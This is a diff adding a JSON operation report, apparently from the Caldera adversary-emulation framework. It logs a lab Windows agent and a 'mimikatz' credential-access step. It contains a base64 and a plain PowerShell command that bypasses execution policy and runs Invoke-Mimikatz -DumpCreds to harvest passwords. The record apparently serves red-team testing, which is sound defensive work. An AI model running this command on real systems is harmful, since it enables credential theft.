@@ -1,0 +1,175 @@
+{
+    "name": "uyigyuigy",
+    "id": 1,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "last_seen": "2020-03-01 20:01:26",
+            "architecture": "amd64",
+            "platform": "windows",
+            "server": "http://192.168.100.131:8888",
+            "host_group": "my_group",
+            "location": "C:\\Users\\Public\\sandcat\\sandcat.exe",
+            "pid": 2836,
+            "ppid": 2516,
+            "trusted": 1,
+            "last_trusted_seen": "2020-03-01 20:01:26",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-03-01 20:01:16",
+    "facts": [
+        {
+            "id": 8,
+            "property": "file.sensitive.extension",
+            "value": "txt",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 9,
+            "property": "file.sensitive.extension",
+            "value": "yml",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 10,
+            "property": "host.service.modifiable",
+            "value": "fax",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 11,
+            "property": "target.org.name",
+            "value": "mitre.org",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 16,
+            "property": "remote.host.ip",
+            "value": "192.168.100.133",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        }
+    ],
+    "finish": "2020-03-01 20:01:32",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 9,
+        "adversary_id": "442baa51-f645-45b6-8a96-e24bcfe8510e",
+        "name": "mimikatz",
+        "description": "run mimikatz",
+        "phases": {
+            "1": [
+                {
+                    "id": 108,
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "tactic": "credential-access",
+                    "technique_name": "Credential Dumping",
+                    "technique_id": "T1003",
+                    "name": "Run Mimikatz",
+                    "test": "cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLWNvbW1hbmQgIi4gLlxJbnZva2UtTWltaWthdHoucHMxIDsgSW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHMiIHwgLi9wYXJzZS1taW1pa2F0ei5wczE=",
+                    "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 108,
+                            "name": "line",
+                            "property": "domain.user.password",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 108,
+                            "payload": "Invoke-Mimikatz.ps1, parse-mimikatz.ps1"
+                        }
+                    ],
+                    "adversary_map_id": 53
+                },
+                {
+                    "id": 107,
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "tactic": "credential-access",
+                    "technique_name": "Credential Dumping",
+                    "technique_id": "T1003",
+                    "name": "Run Mimikatz",
+                    "test": "cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLWNvbW1hbmQgIi4gLlxJbnZva2UtTWltaWthdHoucHMxIDsgSW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHMiIHwgLi9wYXJzZS1taW1pa2F0ei5wczE=",
+                    "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 107,
+                            "name": "line",
+                            "property": "domain.user.password",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 107,
+                            "payload": "Invoke-Mimikatz.ps1, parse-mimikatz.ps1"
+                        }
+                    ],
+                    "adversary_map_id": 53
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "command": "powershell.exe -executionpolicy bypass -command \". .\\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -DumpCreds\" | ./parse-mimikatz.ps1",
+            "delegated": "2020-03-01 20:01:21.418946",
+            "run": "2020-03-01 20:01:21",
+            "status": 1,
+            "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+            "name": "Run Mimikatz",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Credential Dumping",
+                "technique_id": "T1003"
+            }
+        }
+    ]
+}
